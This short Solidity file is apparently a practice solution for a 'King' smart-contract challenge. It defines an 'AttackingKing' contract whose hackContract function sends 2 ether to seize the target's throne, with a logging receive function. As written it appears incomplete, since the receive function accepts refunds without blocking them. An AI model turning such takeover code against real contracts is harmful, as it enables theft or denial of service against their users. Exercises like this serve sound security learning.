// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;
    King private kingContract;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        kingContract = King(payable(contractAddress));
    }

    function hackContract() external {
        console.log(address(this).balance);
        console.log("Sending payment");
        payable(contractAddress).transfer(2 ether);
    }

    receive() external payable {
        console.log("Received payment back", msg.value);
    }
}
